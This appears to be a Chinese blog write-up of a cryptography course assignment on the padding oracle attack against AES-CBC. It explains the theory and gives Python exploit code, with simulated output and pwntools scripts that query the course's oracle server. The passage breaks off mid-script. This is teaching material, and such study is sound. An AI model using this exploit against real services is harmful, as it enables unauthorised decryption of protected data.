    <content type="html"><![CDATA[<h1 id="padding-oracle-attack"><a href="#padding-oracle-attack" class="headerlink" title="padding oracle attack"></a>padding oracle attack</h1><blockquote><p><a href="https://www.dazhuanlan.com/aladengodman/topics/1812953" target="_blank" rel="noopener">详解参考</a></p><p><a href="https://www.tr0y.wang/2017/10/06/Crypto1/" target="_blank" rel="noopener">学长blog</a></p></blockquote><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>In this assignment, you must decrypt a challenge ciphertext generated using AES in CBC-mode with PKCS #5 padding. (Note: technically this is PKCS #7 padding,since the block size of AES is 16 bytes. But the padding is done in exactly the same way as PKCS #5 padding.) To do so, you will be given access to a server that will decrypt any ciphertexts you send it (using the same key that was used to generate the challenge ciphertext)…but that will only tell you whether or not decryption results in an error!</p><p>要求解密一个 CBC 工作模式，PKCS #7 方式填充，AES 加密的挑战密文。为此，你需要访问一个服务器（该服务器能用挑战密钥解密任何你发送的密文），它将返回你发送的密文是否填充正确。</p><p>All the files needed for this assignment are available here, including a README file that should explain everything.</p><p>此作业所需的所有文件都已<a href="http://oqx4hhfj3.bkt.clouddn.com/PA2-AES.rar" target="_blank" rel="noopener">在这里</a>给出，包括一个解释一切的 README 文件。</p><p>Note that this assignment requires the ability to perform basic networking. Because we do not assume students necessarily know this, we have provided stub code for doing basic networking in C, Java, Ruby, and Python, but you are welcome to use any language of your choice as long as you are able to write code for basic networking functionality in that language. (Students may feel free to post stub code in other languages for the networking component on the discussion boards.)</p><p>注意到此作业需要执行基本网络的功能。因为我们不要求学生必须知道这一点，所以我们提供了在 C，Java，Ruby 和 Python 中进行基本网络连接的存根代码，但是欢迎使用任何您选择的语言，只要您能够编写代码该语言的基本网络功能。（学生可以自由地在讨论板上为其他语言的网络组件发布存根代码。）</p><p>The first step in this project is to send the challenge ciphertext to the server, and verify that you receive back a “no error” message. Once you can do that, the rest is “just” crypto…</p><p>该项目的第一步是将挑战密文发送到服务器，并验证您是否收到 “无错误” 消息。一旦你可以做到这一点，其余的是 “只是” 加密…</p><p>The plaintext,when converted to ASCII, is readable English text, and so you should be able to tell once you have been successful. Once you have successfully recovered the plaintext (in ASCII).</p><p>明文转换为 ASCII 时，是可读的英文文本，所以一旦成功恢复明文，便可得知。</p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="CBC-工作模式"><a href="#CBC-工作模式" class="headerlink" title="CBC 工作模式"></a>CBC 工作模式</h3><p>CBC 模式是一种分组链接模式，目的是为了使原本独立的分组密码加密过程形成迭代，使每次加密的结果影响到下一次加密。初始化向量 IV 与第一组明文(分组 1)异或后，再经过运算得到的结果作为新的 IV，用于下一分组(分组 2)，不断迭代下去：<br><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/Crypto1/20180917032437175.png!blog" target="_blank" rel="noopener"><img src="20180917032437175.png" alt="加密"></a></p><p>解密过程是加密过程的逆过程：<br><a href="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/Crypto1/20180917032510248.png!blog" target="_blank" rel="noopener"><img src="20180917032510248.png" alt="解密"></a></p><h3 id="PKCS-7-填充"><a href="#PKCS-7-填充" class="headerlink" title="PKCS #7 填充"></a>PKCS #7 填充</h3><p>以整字节填充。每个填充字节的值是用于填充的字节数，即是说，添加 N 个字节，每个的值都是 N。 填充的字节数取决于信息末尾到块边缘的距离。</p><p>如:</p><blockquote><p>分组长度8bytes</p><p>dd: 数据</p></blockquote><p>缺少 1 位(1 个 Padding)， 填充位为： <code>0x01</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">dd</span> <span class="selector-tag">dd</span> <span class="selector-tag">dd</span> <span class="selector-tag">dd</span> <span class="selector-tag">dd</span> <span class="selector-tag">dd</span> <span class="selector-tag">dd</span> <span class="number">01</span></span><br></pre></td></tr></table></figure><p>缺少 5 位(5 个 Padding)， 填充位为： <code>0x05 0x05 0x05 0x05 0x05</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd dd dd <span class="number">05</span> <span class="number">05</span> <span class="number">05</span> <span class="number">05</span> <span class="number">05</span></span><br></pre></td></tr></table></figure><h3 id="padding-oracle-attack-攻击原理"><a href="#padding-oracle-attack-攻击原理" class="headerlink" title="padding-oracle attack 攻击原理"></a>padding-oracle attack 攻击原理</h3><p>padding-oracle attack 针对 CBC 工作模式攻击，与具体加密算法无关。</p><p>服务器判断解密出的明文是否出错一般从后开始检验明文末尾字节的值，若末尾为<code>0x01</code> 则末尾一字节为<code>0x01</code>，填充末尾为<code>0x03</code> 则末尾三字节均为<code>0x03</code> 。利用服务器的返回值，可以在不知道密钥的情况下得到明文。</p><h4 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h4><p>例如现在有一个 CBC 工作模式，PKCS #7 方式填充的密文 IV||C（分组大小为 8 字节）：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">21 </span>A2 DD <span class="number">04</span> <span class="number">35</span> <span class="number">0</span>A BA <span class="number">58</span> | CD DD AA DD <span class="number">34</span> <span class="number">23</span> A1 <span class="number">64</span> |</span><br></pre></td></tr></table></figure><p>为了方便描述，用 $C[i]$ 表示第 $i$ 个分组，$C[i][j]$ 表示第 $i$ 个分组第 $j$ 个字节，$D(*)$ 表示解密算法。</p><p>我们想要解密最后一个分组 $C[n]$ ，即求 $P[n]$ 。</p><p>先求明文最后一个分组的最后一位，即 $P[n][7]$ 。</p><h4 id="最后一位"><a href="#最后一位" class="headerlink" title="最后一位"></a>最后一位</h4><p>假设此时仅填充一个字节，构造初始向量 $IV_0$ 值为：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> |</span><br></pre></td></tr></table></figure><p>向服务器发送这两个分组构成的密文 $IV_0||C[n]$ ：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> | CD DD AA DD <span class="number">34</span> <span class="number">23</span> A1 <span class="number">64</span> |</span><br></pre></td></tr></table></figure><p>要使服务器的返回值为 $1$（即显示 Padding 正确），那么明文最后一位应该为 <code>0x01</code> 。</p><p>那么我们需要遍历 $[0,256)$ 修改 $IV_0[7]$ 的值，直到服务器的返回值为 $1$ 。</p><p>假设此时初始向量 $IV_1$ 为：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A0 |</span><br></pre></td></tr></table></figure><p>此时, 明文末尾一位为 $(D(C[n]) \oplus IV_1)[7] == 0x01$。</p><p>于是可以得到</p><script type="math/tex; mode=display">D(C[n])[7] = 0x01 \oplus IV_1[7] \\\\P[n][7] = D(C[n])[7] \oplus C[n-1][7] = 0x01 \oplus IV_1[7] \oplus C[n-1][7]\\\\</script><p>至此，明文最后一个分组的最后一位已经得到，接下来求明文最后一个分组的倒数第二位。</p><h4 id="倒数第二位"><a href="#倒数第二位" class="headerlink" title="倒数第二位"></a>倒数第二位</h4><p><strong>1.修正最后一位</strong></p><blockquote><p>目的: 使明文的最后一位是 <code>0x02</code> </p><p>方法: 在已知a, b, 且 a xor b = 1 的情况下, 容易获得a’ s.t. a’ xor b = 2</p></blockquote><p>此时假设填充了两个字节，即明文末尾两位均为 $0x02$ 。</p><p>由于 $D(C[n][7]) = 0x01 \oplus IV_1[7]$ ，所以要使 $D(C[n][7]) \oplus IV_1^{‘}[7] = 0x02$ 时，有</p><script type="math/tex; mode=display">IV_1^{'}[7] = D(C[n])[7] \oplus 0X02 = 0X01 \oplus IV_1[7] \oplus 0X02</script><p>此时的初始向量 $IV_1^{‘}$ 为：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A3 |</span><br></pre></td></tr></table></figure><p><strong>2.获取倒数第二位</strong></p><blockquote><p>目的: 使明文的倒数第二位是 <code>0x02</code> , 以满足padding的要求</p></blockquote><p>遍历 $[0,256)$ 修改 $IV_1^{‘}[6]$ 的值，直到服务器的返回值为 $1$ 。</p><p>假设此时初始向量 $IV_2$ 为：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> A3 |</span><br></pre></td></tr></table></figure><p>由于, 明文倒数第二位为<code>0x02</code>:  $D(C[n])[6] \oplus IV_2[6] = 0x02$ </p><p>于是可得: </p><script type="math/tex; mode=display">D(C[n])[6] = 0X02 \oplus IV_2[6] \\\\P[n][6] = D(C[n])[6] \oplus C[n-1][6] = 0X02 \oplus IV_2[6] \oplus C[n-1][6]\\\\</script><p>明文最后一个分组的倒数第二位也已经得到。</p><p>依次类推，由此即可以仅根据密文还原出明文。</p><h4 id="一般情况"><a href="#一般情况" class="headerlink" title="一般情况"></a>一般情况</h4><blockquote><p>第i轮: 从1开始,注意写代码时数组从0开始</p></blockquote><p><strong>1.准备</strong></p><p>开3个数组</p><ul><li>初始向量: iv = [全0(数字)]</li><li>中间值(D(c)): Ivalue= []</li><li>明文: m = []</li></ul><p><strong>2.修正</strong></p><p>$IV_{i-1}-&gt;IV_{i-1}^{‘}$:  $Ivalue$ 中的所有<strong>非零值</strong>与 $0xi$ 进行异或</p><p><strong>3.遍历</strong></p><p>获取$IV_{i}$</p><ul><li>iv[-i] 赋值</li></ul><p><strong>4.计算数据,并保存</strong></p><script type="math/tex; mode=display">Ivalue[-i] = D(C[n][-i]) = 0xi \oplus IV_i[-i] \\\\P[n][-i] = D(C[n][-i]) \oplus C[n-1][-i]</script><ul><li>Ivalue.append()</li><li>m.append()</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><blockquote><p>由于没连接上服务器,所以用随机数来表示是否能正确解密XD</p><p>之后需修改judge函数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">10</span>)</span><br><span class="line">c = [<span class="string">'9F0B13944841A832B2421B9EAF6D9836'</span>,</span><br><span class="line">    <span class="string">'813EC9D944A5C8347A7CA69AA34D8DC0'</span>,</span><br><span class="line">    <span class="string">'DF70E343C4000A2AE35874CE75E64C31'</span>]</span><br><span class="line"><span class="comment"># 判断返回是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(build)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> random.randint(<span class="number">0</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从最后一块开始破译 c[-x]</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,len(c)):</span><br><span class="line">    print(<span class="string">"Detecting Block &#123;&#125;"</span>.format(x))</span><br><span class="line">    block = c[-x] <span class="comment"># 当前分组</span></span><br><span class="line">    prior_block = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> bytes.fromhex(c[-x<span class="number">-1</span>])] <span class="comment"># 前一分组</span></span><br><span class="line">    </span><br><span class="line">    iv = [<span class="number">0</span>]*<span class="number">16</span> <span class="comment"># 初始向量</span></span><br><span class="line">    Ivalue = [] <span class="comment"># 中间值</span></span><br><span class="line">    m = [] <span class="comment"># 明文(hex)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 一个分组16B</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        print(<span class="string">" round &#123;&#125;"</span>.format(i))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 修正</span></span><br><span class="line">        l = len(Ivalue)</span><br><span class="line">        iv = iv[:<span class="number">16</span>-l] + [x^i <span class="keyword">for</span> x <span class="keyword">in</span> Ivalue[::<span class="number">-1</span>]]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爆破vi[-i]</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(pow(<span class="number">2</span>,<span class="number">8</span>)):</span><br><span class="line">            iv[-i] = j</span><br><span class="line">            build = <span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> iv]) + block</span><br><span class="line">            <span class="keyword">if</span> judge(build):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 更新</span></span><br><span class="line">        Ivalue.append(iv[-i]^i)</span><br><span class="line">        m.append(Ivalue[<span class="number">-1</span>]^prior_block[-i])</span><br><span class="line">        print(<span class="string">" - Ivalue : &#123;&#125;"</span>.format(<span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> Ivalue[::<span class="number">-1</span>]])))</span><br><span class="line">        print(<span class="string">" - m      : &#123;&#125;"</span>.format(<span class="string">''</span>.join([str(hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> m[::<span class="number">-1</span>]])))</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Detecting</span> <span class="string">Block</span> <span class="number">1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">01</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">c1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">2</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">0201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">3</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">4e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">4</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">04030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">a74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">5</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">0504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">9fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">6</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">a09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">7</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">07060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">7ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">8</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">0807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">9</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">3d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">10</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">c23d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">11</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">aec23d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">12</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">48aec23d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">13</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">d448aec23d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">14</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0e0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">c7d448aec23d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">15</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0f0e0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">31c7d448aec23d727ba09fa74e8fc1</span></span><br><span class="line"> <span class="string">round</span> <span class="number">16</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">100f0e0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">9131c7d448aec23d727ba09fa74e8fc1</span></span><br><span class="line"><span class="string">Detecting</span> <span class="string">Block</span> <span class="number">2</span></span><br><span class="line"> <span class="string">round</span> <span class="number">1</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">01</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="number">37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">2</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">0201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">3</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">4</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">04030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">ab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">5</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">0504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">6</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">1d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">7</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">07060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">8</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">0807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">ba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">9</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="number">090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">3bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">10</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">a23bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">11</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">4aa23bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">12</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">444aa23bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">13</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">99444aa23bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">14</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0e0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">1d99444aa23bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">15</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">0f0e0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">041d99444aa23bba451d9bab6e9a37</span></span><br><span class="line"> <span class="string">round</span> <span class="number">16</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">Ivalue :</span> <span class="string">100f0e0d0c0b0a090807060504030201</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">m      :</span> <span class="string">8f041d99444aa23bba451d9bab6e9a37</span></span><br></pre></td></tr></table></figure><h3 id="确认服务器可用"><a href="#确认服务器可用" class="headerlink" title="确认服务器可用"></a>确认服务器可用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'128.8.130.16'</span>, <span class="number">49101</span>)</span><br><span class="line">msg= <span class="string">"9F0B13944841A832B2421B9EAF6D9836813EC9D944A5C8347A7CA69AA34D8DC0DF70E343C4000A2AE35874CE75E64C31"</span></span><br><span class="line">msg = bytes.fromhex(msg)</span><br><span class="line">lst = list(msg)</span><br><span class="line"><span class="comment"># 前面添加分组数目(包括IV)</span></span><br><span class="line">lst.insert(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 最后添加一个0</span></span><br><span class="line">lst.append(<span class="number">0</span>)</span><br><span class="line">r.send(bytes(lst))</span><br><span class="line">print(r.recv(numb=<span class="number">2</span>).decode()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>最后若返回<code>1</code>则说明服务器正常</p><h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="string">'9F0B13944841A832B2421B9EAF6D9836'</span>,</span><br><span class="line">    <span class="string">'813EC9D944A5C8347A7CA69AA34D8DC0'</span>,</span><br><span class="line">    <span class="string">'DF70E343C4000A2AE35874CE75E64C31'</span>]</span><br><span class="line">r = remote(<span class="string">'128.8.130.16'</span>,<span class="number">49101</span>)</span><br><span class="line"><span class="comment"># f判断返回是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(build)</span>:</span></span><br><span class="line">    msg = bytes.fromhex(build)</span><br><span class="line">    lst = list(msg)</span><br><span class="line">    lst.insert(<span class="number">0</span>,<span class="number">2</span>)</span><br><span 